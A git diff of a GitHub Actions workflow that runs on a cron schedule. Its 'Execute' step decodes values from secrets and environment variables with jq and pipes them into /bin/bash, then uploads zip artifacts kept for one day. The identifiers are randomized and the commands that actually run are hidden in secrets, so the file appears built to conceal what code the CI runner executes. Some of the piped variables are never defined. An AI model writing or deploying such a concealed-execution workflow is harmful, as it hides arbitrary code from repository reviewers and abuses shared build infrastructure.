@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '2 4,10,16,22 * * *'
+    - cron: '34 4,10,16,22 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,17 +18,17 @@ jobs:
           fetch-depth: 1
       - name: Execute
         env:
-          ckwq6209: ${{ secrets.ckwq6209 }}
+          x065: ${{ secrets.x065 }}
         run: |
-          printf '%s' "$ckwq6209" | jq -r .f9 | /bin/bash
-          printf '%s' "$p80" | jq -r .g1 | /bin/bash
-          printf '%s' "$p0" | jq -r .hd4 | /bin/bash
-          printf '%s' "$gudc4763" | jq -r .x07 | /bin/bash
+          printf '%s' "$x065" | jq -r .xsx668 | /bin/bash
+          echo $ceao10541 | jq -r .ei172 | /bin/bash
+          echo $cz82431 | jq -r .wrko0 | /bin/bash
+          echo $rh649 | jq -r .cetfb03 | /bin/bash
 
       - name: Upload artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: z1LbgbaQ
+          name: 4Lf85LQt
           path: "*.zip"
           retention-days: 1
